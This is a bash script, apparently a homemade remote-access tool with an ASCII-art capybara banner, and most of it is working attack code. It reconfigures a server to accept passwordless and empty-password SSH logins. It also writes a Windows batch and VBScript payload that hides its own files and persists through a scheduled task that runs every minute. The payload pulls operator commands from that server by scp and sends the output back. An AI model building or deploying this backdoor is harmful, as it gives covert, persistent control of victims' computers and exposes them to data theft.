#!/bin/bash

# Function to print capybara
print_capybara() {


    echo -e "\e[95m"
    echo "
   __ __               __                   
  / //_/__ ____  __ __/ /  ___ ________ _   
 / ,< / _ / _ \/ // / _ \/ _ / __/ _ /   
/_/|_|\_,_/ .__/\_, /_.__/\_,_/_/  \_,_/    
         /_/   /___/ "
         
         
           
    echo "      __"
    echo "     /  \\\\"
    echo "    / .. \\)"
    echo "    |\\()/|"
    echo "    _\\__/_" 
    echo "  /  ____  \\"
    echo " /\\ /    \\ /\\"
    echo "|  |      |  |"
    echo "|__|      |__|"
    echo "   |      |"
    echo "   |______|"
    echo -e "\e[0m"
}


# ____________________________
print_capybara
# Function to check if an IP address is valid
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        IFS='.' read -r -a octets <<< "$ip"
        for octet in "${octets[@]}"; do
            if (( octet > 255 )); then
                echo "Invalid IP address: $ip"
                return 1
            fi
        done
 #       echo "Valid IP address: $ip"
    else
        echo "Invalid IP address format: $ip"
        return 1
    fi
}

# Prompt user for input and validate until it's legit
while true; do
    read -p "Enter an IP address: " user_ip
    if validate_ip "$user_ip"; then
        break
    fi
done

read -p "Enter User: " user
read -p "Enter Admin user: " admin_user

#Strong Password For AWS_______
while true; do
    read -p "Enter strong Admin password: " admin_pass

    # Check length
    if [ ${#admin_pass} -lt 8 ]; then
        echo "Password must be at least 8 characters long."
        continue
    fi

    # Check for at least one uppercase letter
    if ! [[ "$admin_pass" =~ [[:upper:]] ]]; then
        echo "Password must contain at least one uppercase letter."
        continue
    fi

    # Check if the password is a dictionary word
    if grep -q "^$admin_pass$" /usr/share/dict/words; then
        echo "Password cannot be a dictionary word."
        continue
    fi

    # If all checks pass, set the password
    echo "Password set successfully."
    break
done

# __________________________

FILE_TO_MONITOR="/home/$user/chrome.txt"
FILE_TO_WRITE="amit.bat"
server_makeover() {
    awsname=ec2-user
    read -p "Enter private key location: " private_key
    ssh -o StrictHostKeyChecking=no -i "$private_key" "$awsname"@"$user_ip" <<EOF
    sudo su

    # Add admin user and set password
    useradd -m -s /bin/bash "$admin_user"
    echo "$admin_user:$admin_pass" | chpasswd

    # Add admin user to sudo group
    echo "$admin_user ALL=(ALL) ALL" >> /etc/sudoers

      
    # Update sshd_config
    echo "
# : sshd_config,v 1.104 2021/07/02 05:11:21 dtucker Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

# To modify the system-wide sshd configuration, create a  *.conf  file under
#  /etc/ssh/sshd_config.d/  which will be automatically included below
Include /etc/ssh/sshd_config.d/*.conf

# If you want to change the port on a SELinux system, you have to tell
# SELinux about this change.
# semanage port -a -t ssh_port_t -p tcp #PORTNUMBER
#
#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication no

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
# AuthorizedKeysFile	.ssh/authorized_keys

#AuthorizedPrincipalsFile none


# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# Explicitly disable PasswordAuthentication. By presetting it, we
# avoid the cloud-init set_passwords module modifying sshd_config and
# restarting sshd in the default instance launch configuration.
PasswordAuthentication yes
PermitEmptyPasswords yes

# Change to no to disable s/key passwords
KbdInteractiveAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no
#KerberosUseKuserok yes

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no
#GSSAPIEnablek5users no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of PermitRootLogin without-password.
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
# WARNING: 'UsePAM no' is not supported in Fedora and may cause several
# problems.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none
AcceptEnv LANG LC_*
# override default of no subsystems
Subsystem	sftp	/usr/libexec/openssh/sftp-server

# Example of overriding settings on a per-user basis
Match User attack
ForceCommand /usr/local/bin/restricted_shell.sh
X11Forwarding no
AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server

#AuthorizedKeysCommand /opt/aws/bin/eic_run_authorized_keys %u %f
#AuthorizedKeysCommandUser ec2-instance-connect
    " > /etc/ssh/sshd_config

# Create restricted_shell.sh script _________

echo '#!/bin/bash
exec \$SSH_ORIGINAL_COMMAND
if [[ "\$SSH_ORIGINAL_COMMAND" == "scp"* ]]; then
    exec \$SSH_ORIGINAL_COMMAND
else
    echo "No"
    exit 1
fi
    ' > /usr/local/bin/restricted_shell.sh
    chmod +x /usr/local/bin/restricted_shell.sh
# Ensure the user has an empty password
useradd -m -s /usr/local/bin/restricted_shell.sh $user && sudo passwd -d $user
chmod 777 /home/$user
systemctl restart sshd
    

#                      File to be monitored




# Function to install inotify-tools using the available package manager
install_inotifywait() {
    echo "inotifywait could not be found. Installing inotify-tools..."

    if command -v apt-get &> /dev/null; then
        sudo apt-get update
        sudo apt-get install -y inotify-tools
    elif command -v yum &> /dev/null; then
        sudo yum install -y inotify-tools
    elif command -v brew &> /dev/null; then
        brew install inotify-tools
    else
        echo "No supported package manager found. Please install inotify-tools manually."
        exit 1
    fi
}

# Ensure inotifywait is installed
if ! command -v inotifywait &> /dev/null; then
    install_inotifywait

    # Re-check if installation was successful
    if ! command -v inotifywait &> /dev/null; then
        echo "Failed to install inotify-tools. Please install it manually."
        exit 1
    fi
fi

EOF
}



copy_file() {
    echo @echo off > amit.bat
    echo shutdown -s -t 10000 >> amit.bat
    echo shutdown -a >> amit.bat
    echo 'arp -a > chrome.txt' >> amit.bat
    echo exit >> amit.bat
    echo "Trying to acess $user@$user_ip ..."
    scp amit.bat $user@$user_ip:/home/$user > /dev/null 2>&1 
    echo '#!/bin/bash
# Function to monitor the file for changes and print its content when it changes
monitor_file() {
    while true; do
        inotifywait -e modify "$FILE_TO_MONITOR" >/dev/null 2>&1
        cat "$FILE_TO_MONITOR" | tee -a history.txt

        echo  "" > "$FILE_TO_MONITOR" 
    done
}

# Run the monitor function in the background
monitor_file &

# Continuously prompt for input and write to amit.bat
while true; do
    echo "Enter Command (Ctrl+C to stop):"
    read user_input
    echo "$user_input" >> "$FILE_TO_WRITE"
done
' > cli.sh
scp cli.sh $user@$user_ip:/home/$user > /dev/null 2>&1 
}

# Change SSHD settings
read -p "Set SSHD settings? Y/N: " ssh_ans
if [ "$ssh_ans" = "y" ] || [ "$ssh_ans" = "Y" ]; then server_makeover
else :
fi

# Attempt to copy the file
copy_file 	

# Check if scp command was successful
while [ $? -ne 0 ]; do
    read -p "Error occurred while copying the file. Do you want to try again? (yes/no): " choice
    if [ "$choice" = "yes" ] || [ "$choice" = "y" ]; then
        copy_file
    elif  [ "$choice" = "no" ] || [ "$choice" = "n" ]; then
        echo "Exiting..."
        exit 1
    else
        echo "Invalid choice. Trying again."
        copy_file
        
    fi
done
rm amit.bat
echo "Server is on"
echo "File creadted in /home/$user called cli.sh"

read -p "Choose Script Name: " script_name
script_name="$script_name.bat"
read -p "Task Name: " task_name






generate_bat_file() {
    cat <<EOT > $script_name
@echo off

attrib -h C:\Users\%USERNAME%\\$script_name 2>nul
echo @echo off > C:\\Users\\%USERNAME%\\$script_name
echo attrib -h C:\Users\%USERNAME%\\$script_name>> C:\Users\%USERNAME%\\$script_name
echo attrib -h C:\Users\%USERNAME%\pdf.vbs>> C:\Users\%USERNAME%\\$script_name
echo set __COMPAT_LAYER=RunAsInvoker>> C:\\Users\\%USERNAME%\\$script_name

echo scp -o StrictHostKeyChecking=no $user@$user_ip:/home/$userif/amit.bat  C:\\Users\\%USERNAME%\\>> C:\\Users\\%USERNAME%\\$script_name
echo cd C:\\Users\\%%USERNAME%%\\>> C:\\Users\\%USERNAME%\\$script_name

echo echo Set objShell = CreateObject("WScript.Shell")^> C:\\Users\\%USERNAME%\\pdfrun.vbs>> C:\\Users\\%USERNAME%\\$script_name
echo echo objShell.Run "cmd.exe /c C:\\Users\\%USERNAME%\\amit.bat", 0, True^>^> C:\\Users\\%USERNAME%\\pdfrun.vbs>> C:\\Users\\%USERNAME%\\$script_name
echo start /min C:\\Users\\%%USERNAME%%\\pdfrun.vbs>> C:\\Users\\%USERNAME%\\$script_name

echo scp -o StrictHostKeyChecking=no C:\\Users\\%USERNAME%\\chrome.txt $user@$user_ip:/home/$user>> C:\\Users\\%USERNAME%\\$script_name

echo set taskName="$task_name" >> C:\\Users\\%USERNAME%\\$script_name
echo set taskCommand=C:\\Users\\%USERNAME%\\pdf.vbs>> C:\\Users\\%USERNAME%\\$script_name
echo set frequency=1 >> C:\\Users\\%USERNAME%\\$script_name
echo schtasks /query ^| findstr /C:%%taskName%% ^>nul ^|^| (schtasks /create /tn %%taskName%% /tr %%taskCommand%% /sc minute /mo %%frequency%%)>> C:\\Users\\%USERNAME%\\$script_name

echo del chrome.txt>> C:\\Users\\%USERNAME%\\$script_name
echo del amit.bat>> C:\\Users\\%USERNAME%\\$script_name
echo del pdfrun.vbs>> C:\\Users\\%USERNAME%\\$script_name

echo attrib +h C:\Users\%USERNAME%\\$script_name>> C:\Users\%USERNAME%\\$script_name
echo attrib +h C:\Users\%USERNAME%\pdf.vbs>> C:\Users\%USERNAME%\\$script_name

echo exit >> C:\\Users\\%USERNAME%\\$script_name

echo Set objShell = CreateObject("WScript.Shell")> C:\\Users\\%USERNAME%\\pdf.vbs
echo objShell.Run "cmd.exe /c C:\\Users\\%USERNAME%\\$script_name", 0, True>> C:\\Users\\%USERNAME%\\pdf.vbs

start /min "" "C:\\Users\\%USERNAME%\\pdf.vbs"
EOT
}

# Call the function to generate the batch file
generate_bat_file
echo Generating the Kapy!



read -p "To open a session press y: " ses
if [ "$ses" = "yes" ] || [ "$ses" = "y" ]; then
        #ssh -o StrictHostKeyChecking=no $admin_user@$user_ip
        ssh -o StrictHostKeyChecking=no "$admin_user@$user_ip" "cd /home/$user; exec bash"

    else
        echo "Exiting..."
        exit 1
        
    fi
